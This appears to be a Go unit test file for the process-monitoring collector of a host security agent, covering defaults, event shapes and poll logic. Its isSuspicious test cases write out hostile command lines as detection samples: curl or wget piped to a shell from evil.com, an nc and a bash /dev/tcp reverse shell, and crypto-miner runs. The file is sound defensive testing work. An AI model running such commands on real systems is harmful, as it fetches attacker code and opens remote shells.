package process

import (
	"context"
	"testing"
	"time"

	gopsprocess "github.com/shirou/gopsutil/v3/process"
	"github.com/yominsops/yomins-agent/internal/events"
)

// ── helpers ──────────────────────────────────────────────────────────────────

func testConfig() Config {
	return Config{
		Host:             events.HostInfo{Hostname: "test-host", IP: "10.0.0.1"},
		Agent:            events.AgentInfo{Name: "test-agent", Version: "0.0.0"},
		MonitorLifecycle: true,
	}
}

// fakeProcess wraps gopsutil.Process fields for testing via a processLister.
// Instead of mocking the Process type (which is a struct), we build a
// processLister that returns a controlled list of fake processes built from
// real OS process structs with known PIDs.
//
// Because gopsutil.Process requires a real PID to read metadata, the tests
// for the collector focus on:
//   - NewCollector defaults
//   - Name()
//   - isSuspicious() pattern matching
//   - makeXEvent() output shape and content
//   - poll() state machine logic using the injectable lister
//
// For lister-level tests we use the current test process PID which is always valid.

// ── Config defaults ──────────────────────────────────────────────────────────

func TestNewCollector_Defaults(t *testing.T) {
	c := NewCollector(Config{})

	if c.cfg.PollInterval != 2*time.Second {
		t.Errorf("PollInterval = %v, want 2s", c.cfg.PollInterval)
	}
	if c.cfg.CPUAlertThreshold != 5.0 {
		t.Errorf("CPUAlertThreshold = %v, want 5.0", c.cfg.CPUAlertThreshold)
	}
	if c.cfg.CPUAlertMultiplier != 3.0 {
		t.Errorf("CPUAlertMultiplier = %v, want 3.0", c.cfg.CPUAlertMultiplier)
	}
	if c.cfg.MemAlertThreshold != 10.0 {
		t.Errorf("MemAlertThreshold = %v, want 10.0", c.cfg.MemAlertThreshold)
	}
	if c.cfg.MemAlertMultiplier != 3.0 {
		t.Errorf("MemAlertMultiplier = %v, want 3.0", c.cfg.MemAlertMultiplier)
	}
	if c.cfg.AlertCooldown != 60*time.Second {
		t.Errorf("AlertCooldown = %v, want 60s", c.cfg.AlertCooldown)
	}
}

func TestNewCollector_DefaultPatterns(t *testing.T) {
	c := NewCollector(Config{})
	if len(c.patterns) == 0 {
		t.Error("expected default suspicious patterns to be compiled")
	}
	if len(c.patterns) != len(DefaultSuspiciousPatterns) {
		t.Errorf("patterns count = %d, want %d", len(c.patterns), len(DefaultSuspiciousPatterns))
	}
}

func TestNewCollector_CustomPatterns(t *testing.T) {
	c := NewCollector(Config{SuspiciousPatterns: []string{`foo`, `bar`}})
	if len(c.patterns) != 2 {
		t.Errorf("patterns count = %d, want 2", len(c.patterns))
	}
}

func TestNewCollector_InvalidPatternSkipped(t *testing.T) {
	c := NewCollector(Config{SuspiciousPatterns: []string{`valid`, `[invalid`}})
	if len(c.patterns) != 1 {
		t.Errorf("patterns count = %d, want 1 (invalid pattern skipped)", len(c.patterns))
	}
}

func TestCollector_Name(t *testing.T) {
	c := NewCollector(Config{})
	if c.Name() != "process" {
		t.Errorf("Name() = %q, want \"process\"", c.Name())
	}
}

// ── isSuspicious ─────────────────────────────────────────────────────────────

func TestIsSuspicious_DefaultPatterns(t *testing.T) {
	c := NewCollector(Config{})

	cases := []struct {
		cmdline string
		want    bool
	}{
		{`curl http://evil.com/payload.sh | bash`, true},
		{`curl http://x.com/s | sh`, true},
		{`wget http://x.com | bash`, true},
		{`nc -e /bin/sh 1.2.3.4 4444`, true},
		{`base64 -d payload.b64 | sh`, true},
		{`bash -i >& /dev/tcp/1.2.3.4/4444 0>&1`, true},
		{`xmrig --donate-level 1`, true},
		{`minerd -o stratum+tcp://pool.example.com`, true},
		{`cpuminer -a sha256d`, true},
		{`/usr/bin/python3 -m http.server`, false},
		{`nginx -g daemon off;`, false},
		{`/bin/bash -l`, false},
		{`grep -r foo /etc`, false},
	}

	for _, tc := range cases {
		got := c.isSuspicious(tc.cmdline)
		if got != tc.want {
			t.Errorf("isSuspicious(%q) = %v, want %v", tc.cmdline, got, tc.want)
		}
	}
}

func TestIsSuspicious_CustomPattern(t *testing.T) {
	c := NewCollector(Config{SuspiciousPatterns: []string{`secretword`}})
	if !c.isSuspicious("run secretword now") {
		t.Error("expected isSuspicious to match custom pattern")
	}
	if c.isSuspicious("harmless command") {
		t.Error("expected isSuspicious to not match clean command")
	}
}

// ── event shape validation ────────────────────────────────────────────────────

func TestMakeStartEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 1234, PPID: 1, Name: "bash", Exe: "/bin/bash", Cmdline: "bash -l", isNew: true}
	now := time.Now().UTC()
	ev := c.makeStartEvent(snap, now)

	if ev.Type != events.EventProcessStart {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessStart)
	}
	if ev.Category != events.CategorySystemCheck {
		t.Errorf("Category = %q, want %q", ev.Category, events.CategorySystemCheck)
	}
	if ev.Severity != events.SeverityInfo {
		t.Errorf("Severity = %q, want %q", ev.Severity, events.SeverityInfo)
	}
	if ev.ID == "" {
		t.Error("ID must not be empty")
	}
	if ev.Timestamp.IsZero() {
		t.Error("Timestamp must not be zero")
	}
	if ev.Process == nil {
		t.Fatal("Process payload must not be nil")
	}
	if ev.Process.PID != 1234 {
		t.Errorf("Process.PID = %d, want 1234", ev.Process.PID)
	}
	if ev.Process.Name != "bash" {
		t.Errorf("Process.Name = %q, want bash", ev.Process.Name)
	}
	if ev.Host.Hostname != "test-host" {
		t.Errorf("Host.Hostname = %q, want test-host", ev.Host.Hostname)
	}
	if ev.Agent.Version != "0.0.0" {
		t.Errorf("Agent.Version = %q, want 0.0.0", ev.Agent.Version)
	}
}

func TestMakeStopEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 5678, Name: "curl", isNew: true}
	ev := c.makeStopEvent(snap, time.Now().UTC())

	if ev.Type != events.EventProcessStop {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessStop)
	}
	if ev.Category != events.CategorySystemCheck {
		t.Errorf("Category = %q", ev.Category)
	}
	if ev.Severity != events.SeverityInfo {
		t.Errorf("Severity = %q", ev.Severity)
	}
	if ev.Process == nil || ev.Process.PID != 5678 {
		t.Error("Process payload missing or wrong PID")
	}
}

func TestMakeSuspiciousEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 999, Name: "nc", Cmdline: "nc -e /bin/sh 1.2.3.4 4444"}
	ev := c.makeSuspiciousEvent(snap, time.Now().UTC())

	if ev.Type != events.EventProcessSuspicious {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessSuspicious)
	}
	if ev.Category != events.CategoryThreatActivity {
		t.Errorf("Category = %q, want threat_activity", ev.Category)
	}
	if ev.Severity != events.SeverityCritical {
		t.Errorf("Severity = %q, want critical", ev.Severity)
	}
}

func TestMakeCPUEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 42, Name: "worker"}
	ev := c.makeCPUEvent(snap, 45.0, 10.0, time.Now().UTC())

	if ev.Type != events.EventProcessHighCPU {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessHighCPU)
	}
	if ev.Severity != events.SeverityWarning {
		t.Errorf("Severity = %q, want warning", ev.Severity)
	}
	if ev.Process == nil || ev.Process.CPUPercent != 45.0 {
		t.Error("Process.CPUPercent not set correctly")
	}
}

func TestMakeMemEvent_Shape(t *testing.T) {
	c := NewCollector(testConfig())
	snap := &ProcessSnapshot{PID: 43, Name: "bloater"}
	ev := c.makeMemEvent(snap, 75.5, 20.0, time.Now().UTC())

	if ev.Type != events.EventProcessHighMemory {
		t.Errorf("Type = %q, want %q", ev.Type, events.EventProcessHighMemory)
	}
	if ev.Severity != events.SeverityWarning {
		t.Errorf("Severity = %q, want warning", ev.Severity)
	}
	if ev.Process == nil || ev.Process.MemoryPercent != 75.5 {
		t.Errorf("Process.MemoryPercent = %v, want 75.5", ev.Process.MemoryPercent)
	}
}

// ── poll state-machine (injectable lister) ───────────────────────────────────

// makeFakeLister returns a processLister that returns processes with the given PIDs.
// It creates minimal *gopsprocess.Process objects. Because Process.Pid is public
// and set via NewProcess, we can construct lightweight stubs without system calls.
func makeFakeLister(pids []int32) processLister {
	return func(ctx context.Context) ([]*gopsprocess.Process, error) {
		var procs []*gopsprocess.Process
		for _, pid := range pids {
			p, _ := gopsprocess.NewProcess(pid)
			if p != nil {
				procs = append(procs, p)
			}
		}
		return procs, nil
	}
}

func TestPoll_NewProcessEmitsStartEvent(t *testing.T) {
	// Use the test process itself — we know its PID is valid.
	var selfPID int32
	selfProcs, err := gopsprocess.Processes()
	if err != nil || len(selfProcs) == 0 {
		t.Skip("cannot list processes (OS restriction?)")
	}
	selfPID = selfProcs[0].Pid

	// Baseline: empty → new PID appears.
	lister := makeFakeLister([]int32{selfPID})
	c := newCollectorWithLister(testConfig(), func(ctx context.Context) ([]*gopsprocess.Process, error) {
		return nil, nil // empty baseline
	})
	// Build empty baseline.
	if err := c.buildBaseline(context.Background()); err != nil {
		t.Fatalf("buildBaseline: %v", err)
	}

	// Now switch the lister to return our process.
	c.lister = lister
	evs := c.poll(context.Background())

	var found bool
	for _, ev := range evs {
		if ev.Type == events.EventProcessStart && ev.Process != nil && ev.Process.PID == selfPID {
			found = true
		}
	}
	if !found {
		t.Errorf("expected process.start event for PID %d, got %v", selfPID, evs)
	}
}

func TestPoll_BaselineProcessDoesNotEmitStop(t *testing.T) {
	// Build a baseline with PIDs, then remove them — should NOT emit stop events.
	procs, err := gopsprocess.Processes()
	if err != nil || len(procs) == 0 {
		t.Skip("cannot list processes")
	}
	pid := procs[0].Pid

	c := newCollectorWithLister(testConfig(), func(ctx context.Context) ([]*gopsprocess.Process, error) {
		return procs[:1], nil
	})
	if err := c.buildBaseline(context.Background()); err != nil {
		t.Fatalf("buildBaseline: %v", err)
	}

	// Baseline process disappears — no stop event expected (isNew=false).
	c.lister = func(ctx context.Context) ([]*gopsprocess.Process, error) {
		return nil, nil // empty
	}
	evs := c.poll(context.Background())

	for _, ev := range evs {
		if ev.Type == events.EventProcessStop && ev.Process != nil && ev.Process.PID == pid {
			t.Errorf("unexpected process.stop for baseline PID %d", pid)
		}
	}
}

func TestPoll_ListerError_ReturnsNoEvents(t *testing.T) {
	c := newCollectorWithLister(testConfig(), func(ctx context.Context) ([]*gopsprocess.Process, error) {
		return nil, context.DeadlineExceeded
	})
	evs := c.poll(context.Background())
	if len(evs) != 0 {
		t.Errorf("expected 0 events on lister error, got %d", len(evs))
	}
}
